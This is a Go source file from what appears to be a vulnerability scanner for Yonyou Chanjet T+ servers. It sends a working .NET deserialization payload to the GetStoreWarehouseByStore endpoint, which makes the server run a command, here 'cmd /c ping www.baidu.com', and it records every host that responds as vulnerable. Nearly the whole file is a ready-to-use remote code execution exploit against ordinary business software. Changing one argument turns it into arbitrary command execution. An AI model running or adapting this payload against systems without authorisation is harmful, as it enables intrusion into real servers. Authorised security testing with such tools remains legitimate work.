package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func GetStoreWarehouseByStoreScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	GetStoreWarehouseByStore := "用友 畅捷通Tplus GetStoreWarehouseByStore 远程代码执行漏洞"
	urls := address + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
	client.Timeout = 5 * time.Second
	response, err := client.Post(urls, "text/plain", strings.NewReader("{\n \"storeID\":{\n  \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n  \"MethodName\":\"Start\",\n  \"ObjectInstance\":{\n   \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n   \"StartInfo\":{\n    \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n    \"FileName\":\"cmd\",\n    \"Arguments\":\"/c ping www.baidu.com\"\n   }\n  }\n }\n}"))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, GetStoreWarehouseByStore)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, GetStoreWarehouseByStore)
		}
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, GetStoreWarehouseByStore, err)
		fmt.Println(output)
		return
	}

	if strings.Contains(string(body), "archivesId") || strings.Contains(string(body), "actorId") || strings.Contains(string(body), "System.Arg") {
		result := GetStoreWarehouseByStore + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, err)
			fmt.Println(output)
		}
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Cyan, currentTime, Reset, Green, Reset, GetStoreWarehouseByStore, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s 响应码: %d", Cyan, currentTime, Reset, Yellow, Reset, GetStoreWarehouseByStore, response.StatusCode)
		fmt.Println(output)
	}
}
